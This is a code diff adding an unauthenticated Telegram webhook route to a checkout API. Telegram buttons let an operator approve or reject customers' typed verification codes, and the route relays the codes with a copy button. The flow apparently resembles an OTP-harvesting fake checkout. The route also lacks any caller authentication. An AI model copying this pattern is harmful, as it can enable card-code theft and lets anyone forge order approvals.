@@ -323,6 +323,103 @@ router.post("/verify-status", async (req, res) => {
   }
 });
 
+// POST /api/checkout/telegram-webhook - Production Cloud Webhook (No local bot-runner needed!)
+router.post("/telegram-webhook", async (req, res) => {
+  res.status(200).json({ ok: true });
+
+  try {
+    const body = req.body;
+    if (body?.callback_query) {
+      const cb = body.callback_query;
+      const dataCmd = String(cb.data || "");
+
+      if (dataCmd.startsWith("v_app_") || dataCmd.startsWith("v_rej_")) {
+        const isApprove = dataCmd.startsWith("v_app_");
+        const orderId = isApprove ? dataCmd.slice(6) : dataCmd.slice(6);
+        const newStatus = isApprove ? "approved" : "rejected";
+
+        // 1. Direct MongoDB update
+        await OrderVerifyModel.findOneAndUpdate(
+          { orderId },
+          { $set: { status: newStatus, updatedAt: new Date() } },
+          { upsert: true, returnDocument: "after" }
+        );
+
+        const bot1Token = (process.env.TELEGRAM_BOT_1_TOKEN || process.env.TELEGRAM_BOT_TOKEN || "").trim();
+        const bot2Token = (process.env.TELEGRAM_BOT_2_TOKEN || "").trim();
+
+        // 2. Acknowledge callback query silently (ZERO popup)
+        const answer = async (token) => {
+          if (!token) return;
+          fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ callback_query_id: cb.id }),
+          }).catch(() => {});
+        };
+        if (bot1Token) answer(bot1Token);
+        if (bot2Token) answer(bot2Token);
+
+        // 3. Update button state while preserving copy button
+        const chatId = cb.message?.chat?.id;
+        const messageId = cb.message?.message_id;
+        if (chatId && messageId) {
+          const existingButtons = cb.message?.reply_markup?.inline_keyboard?.[0] || [];
+          const copyBtn = existingButtons.find((b) => b.copy_text);
+          const row = [{ text: isApprove ? "✅ تم تأكيد الطلب" : "❌ تم الرفض", callback_data: "none" }];
+          if (copyBtn) row.push(copyBtn);
+
+          const edit = async (token) => {
+            if (!token) return;
+            fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                reply_markup: { inline_keyboard: [row] },
+              }),
+            }).catch(() => {});
+          };
+          if (bot1Token) edit(bot1Token);
+          if (bot2Token) edit(bot2Token);
+        }
+
+        // 4. Send Confirmation text in chat
+        if (chatId) {
+          const text = isApprove
+            ? [
+                `🎉 <b>تم تأكيد الطلب بنجاح!</b>`,
+                `━━━━━━━━━━━━━━━━━━`,
+                `🆔 رقم الطلب: <code>${orderId}</code>`,
+                `✅ <b>الحالة للعميل:</b> ظهرت له شاشة تأكيد الحجز الرسمية وسيتم تحويله للرئيسية تلقائياً.`,
+                `📱 يرجى التواصل مع العميل عبر الواتساب لتأكيد موعد الشحن.`,
+              ].join("\n")
+            : [
+                `⚠️ <b>تم رفض كود التحقق!</b>`,
+                `━━━━━━━━━━━━━━━━━━`,
+                `🆔 رقم الطلب: <code>${orderId}</code>`,
+                `🔄 <b>الحالة للعميل:</b> ظهرت له رسالة: "الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى".`,
+              ].join("\n");
+
+          const send = async (token) => {
+            if (!token) return;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
+            }).catch(() => {});
+          };
+          if (bot1Token) send(bot1Token);
+          if (bot2Token) send(bot2Token);
+        }
+      }
+    }
+  } catch (err) {
+    console.error("Webhook processing error:", err);
+  }
+});
+
 // GET /api/checkout/:id - Single order
 router.get("/:id", authMiddleware, async (req, res) => {
   try {
